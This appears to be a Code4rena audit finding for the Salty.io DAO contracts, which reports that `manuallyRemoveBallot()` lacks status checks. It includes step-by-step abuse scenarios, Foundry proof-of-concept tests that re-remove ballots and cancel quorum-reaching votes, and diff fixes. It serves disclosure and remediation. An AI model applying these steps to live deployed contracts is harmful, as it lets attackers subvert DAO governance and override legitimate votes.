# [M] `manuallyRemoveBallot()` doesn't check if the ballot can be finalized or has been removed before

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-03-saltyio-mitigation
Published: 2024-03-06
Source: https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/82
Type: code-finding

## Details
# Lines of code

https://github.com/othernet-global/salty-io/blob/758349850a994c305a0ab9a151d00e738a5a45a0/src/dao/DAO.sol#L271-L279
https://github.com/othernet-global/salty-io/blob/758349850a994c305a0ab9a151d00e738a5a45a0/src/dao/Proposals.sol#L131-L153


# Vulnerability details

# Comments
In the original implementation, a ballot cannot be closed or canceled without meeting the required quorum, even if the `ballotMinimumEndTime` has passed.

# Mitigation
[commit 7583498](https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0)
The mitigation introduced a variable `ballotMaximumDuration` for ballot and a function `DAO#manuallyRemoveBallot()`. 
Whenever a ballot is expired, it can be removed by any one. 

# Impact
Three new issues were produced due to missing status checks:
1. Two or more living ballots with the same name can exist at the same time
2. One eligible user can create multi ballots at the same time
3. A ballot could be removed accidentally or intentionally even it has sufficient votes

# Proof of Concept
- Issue 1:
  - Alice created ballotA, which was expired without enough votes
  - ballotA was removed by calling `DAO#manuallyRemoveBallot()`
  - Alice created ballotB
  - Alice called `DAO#manuallyRemoveBallot()` to remove ballotA again. `_userHasActiveProposal[Alice]` was reset to `false`
  - Alice created ballotC successfully even ballotB is living.
- Issue 2: 
  - Alice created ballotA(ballotID = A1), which was expired without enough votes
  - The ballotA was removed by calling `DAO#manuallyRemoveBallot()`
  - Alice created ballotA(ballotID = A2) again (same ballot name but different ballotID)
  - Bob called `DAO#manuallyRemoveBallot(A1)` to remove ballot again, `openBallotsByName[ballotA]` was deleted
  - Bob created ballotA successfully even Alice's ballotA is opened.
- Issue 3:
  - Alice creates a new ballot with `ballotMinimumDuration` as 10 days and `ballotMaximumDuration` as 30 days
  - The voting number is very closed to `requiredQuorum`
  - Bob votes on it in day 30, now the voting number reaches `requiredQuorum` threshold.
  - However, Charlie doesn't like the voting result, he call `DAO#manuallyRemoveBallot()` to remove the vote.

POC of Issue 1 & 2:
Copy below codes to [DAO.t.sol](https://github.com/othernet-global/salty-io/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testManualRemovalBallotIssue1And2&2`
```solidity
function testManualRemovalBallotIssue1And2() public
{
    // Alice stakes her SALT to get voting power
    vm.startPrank(address(daoVestingWallet));
    salt.transfer(alice, 1000000 ether);				// for staking and voting
    salt.transfer(address(dao), 1000000 ether); // bootstrapping rewards
    vm.stopPrank();

    vm.startPrank(alice);
    staking.stakeSALT(500000 ether);

    IERC20 test = new TestERC20( "TEST", 18 );
    string memory ballotName = string.concat("whitelist:", Strings.toHexString(address(test)), "url", "description" );
    // Propose a whitelisting ballot
    proposals.proposeTokenWhitelisting(test, "url", "description");

    uint256 ballotID = 1;

    // Increase block time to finalize the ballot
    skip( daoConfig.ballotMaximumDuration() + 1);

    // Propose a whitelisting ballot
    vm.expectRevert( "Users can only have one active proposal at a time" );
    proposals.proposeTokenWhitelisting(test, "url", "description");

    dao.manuallyRemoveBallot(ballotID);
    assertEq(proposals.ballotForID(ballotID).ballotIsLive, false, "Ballot should have been removed");

    uint256 secondBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info a proposal named `ballotName` is created
    assertEq(proposals.openBallotsByName(ballotName), secondBallot);
    //@audit-info alice has active proposal
    assertEq(proposals.userHasActiveProposal(alice), true);

    uint256 thirdBallot;
    //@audit-info alice can not create another proposal because she has one active proposal
    vm.expectRevert( "Users can only have one active proposal at a time" );
    thirdBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info The closed ballot was removed again
    dao.manuallyRemoveBallot(ballotID);
    //@audit-info the proposal named `ballotName` was removed
    assertEq(proposals.openBallotsByName(ballotName), 0);
    //@audit-info alice doesn't have active proposal now
    assertEq(proposals.userHasActiveProposal(alice), false);
    //@audit-info salice created another proposal named `ballotName`
    thirdBallot = proposals.proposeTokenWhitelisting(test, "url", "description");
    //@audit-info the ballotId of `ballotName` was changed to thirdBallot
    assertEq(proposals.openBallotsByName(ballotName), thirdBallot);
}
```

POC of Issue 3:
Copy below codes to [DAO.t.sol](https://github.com/othernet-global/salty-io/blob/main/src/dao/tests/DAO.t.sol) and run `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testManualRemovalBallotIssue3`
```solidity
    function testManualRemovalBallotIssue3() public
    {
        // Alice stakes her SALT to get voting power
        vm.startPrank(address(daoVestingWallet));
        salt.transfer(alice, 500000 ether);// for staking and voting
        salt.transfer(bob, 500000 ether);
        salt.transfer(address(dao), 1000000 ether); // bootstrapping rewards
        vm.stopPrank();

        //@audit-info alice creates a token whitelisting proposal
        vm.startPrank(alice);
        salt.approve(address(staking), type(uint256).max);
        staking.stakeSALT(500000 ether);
        IERC20 test = new TestERC20( "TEST", 18 );
        // Propose a whitelisting ballot
        proposals.proposeTokenWhitelisting(test, "url", "description");
        uint256 ballotID = 1;
        // Increase block time to finalize the ballot
        skip( daoConfig.ballotMaximumDuration() + 1);
        vm.stopPrank();
        //@audit-info the proposal can not be finalized without enough votes
        assertEq(proposals.canFinalizeBallot(ballotID), false);
        //@audit-info bob votes on it
        vm.startPrank(bob);
        salt.approve(address(staking), type(uint256).max);
        staking.stakeSALT(500000 ether);
        proposals.castVote(ballotID, Vote.YES);
        vm.stopPrank();
        //@audit-info the proposal can be finalized 
        assertEq(proposals.canFinalizeBallot(ballotID), true);
        //@audit-info however it can be removed
        dao.manuallyRemoveBallot(ballotID);
        assertEq(proposals.ballotForID(ballotID).ballotIsLive, false, "Ballot should have been removed");
    }
```
# Tools Used
Manual review
# Recommended Mitigation Steps
Check if the ballot is living before removing it:
```diff
function markBallotAsFinalized( uint256 ballotID ) external nonReentrant
{
    require( msg.sender == address(exchangeConfig.dao()), "Only the DAO can mark a ballot as finalized" );

    Ballot storage ballot = ballots[ballotID];
+   require(ballot.ballotIsLive, "The ballot has been finalized");
    // Remove finalized whitelist token ballots from the list of open whitelisting proposals
    if ( ballot.ballotType == BallotType.WHITELIST_TOKEN )
        _openBallotsForTokenWhitelisting.remove( ballotID );

    // Remove from the list of all open ballots
    _allOpenBallots.remove( ballotID );

    ballot.ballotIsLive = false;

    // Indicate that the user who posted the proposal no longer has an active proposal
    address userThatPostedBallot = _usersThatProposedBallots[ballotID];
    _userHasActiveProposal[userThatPostedBallot] = false;

    delete openBallotsByName[ballot.ballotName];

    emit BallotFinalized(ballotID);
}
```
Any ballot that can be finalized should not be removable:
```diff
function manuallyRemoveBallot( uint256 ballotID ) external nonReentrant
{
    Ballot memory ballot = proposals.ballotForID(ballotID);

+   require( !proposals.canFinalizeBallot(ballotID), "The ballot is able to be finalized" );
    require( block.timestamp >= ballot.ballotMaximumEndTime, "The ballot is not yet able to be manually removed" );

    // Mark the ballot as no longer votable and remove it from the list of open ballots
    proposals.markBallotAsFinalized(ballotID);
}
```








## Assessed type

Invalid Validation
